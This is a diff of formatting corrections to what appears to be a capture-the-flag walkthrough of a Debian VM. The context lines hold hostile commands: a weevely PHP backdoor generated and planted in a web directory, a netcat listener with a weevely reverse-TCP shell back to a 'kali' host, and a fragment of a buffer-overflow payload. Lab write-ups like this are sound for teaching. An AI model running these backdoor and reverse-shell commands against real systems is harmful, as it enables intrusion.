@@ -59,7 +59,7 @@ PORT      STATE SERVICE
 80/tcp    open  http
 111/tcp   open  rpcbind
 40592/tcp open  unknown
-MAC Address: 08:00:27:6A:29:81 (Oracle VirtualBox virtual NIC)
+MAC Address: 12:34:56:78:9A:BC (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
 ```
@@ -269,7 +269,7 @@ _Note : the shell provided does not have TTY, we'll see later how to workaround_
 On my hacking machine, I generate a backdoor :
 
 ```
-#`weevely`generate pass ./shell.php
+# weevely generate pass ./shell.php
 ```
 
 Let's find a place where we can put our backdoor.
@@ -309,7 +309,7 @@ When transfer is done, `CTRL+C` both side of connection.
 ```
 weevely http://debian.home/include/shell.php pass
 
-[+]`weevely`4.0.1
+[+] weevely 4.0.1
 
 [+] Target:	debian.home
 [+] Session:	/root/.weevely/sessions/debian.home/shell_0.session
@@ -336,7 +336,7 @@ This must be the user to reach for owning `user.txt`.
 
 ### Trying to break in `clapton`
 
-Nothing obvious (to me) at this point. So using`weevely``:file_upload` command, I uploaded [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).
+Nothing obvious (to me) at this point. So using `weevely` `:file_upload` command, I uploaded [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).
 
 But for comfortably running linpeas, or even run `su` command, a TTY shell is required,
 which is unfortunatly not the case with weevely.
@@ -344,7 +344,7 @@ which is unfortunatly not the case with weevely.
 #### Spawn a TTY shell
 
 - on my hacking machine, `nc -lnvp 10000` : connection opening on 10000
-- on VM, use another`weevely`command : `:backdoor_reversetcp kali 10000`
+- on VM, use another`weevely` command : `:backdoor_reversetcp kali 10000`
 
 Now, several methods exists for spawning shell with TTY, I used the latter (to be runned on VM) :
 
@@ -399,7 +399,7 @@ clapton@debian:~$ ./input 1111
 
 #### Decompilation
 I retrieve the executable to my hacking machine by putting it in `/var/www/html/include`
-(using`weevely`and www-data user). So after I can regularily download it.
+(using `weevely` and www-data user). So after I can regularily download it.
 
 Feeding it to [GHIDRA](https://ghidra-sre.org/), here is `main` function decompiled :
 
@@ -531,7 +531,7 @@ print NOP + shellcode + pad + EIP
 - Fill with 'A'
 - `struct.pack` is useful for little-endianing addresses (bytes inversion)
 
-Then I can push `exploit_1.py` to VM by using `:file_upload``weevely`command
+Then I can push `exploit_1.py` to VM by using `:file_upload` `weevely` command
 
 #####  Return address to put in EIP
 For finding return address :
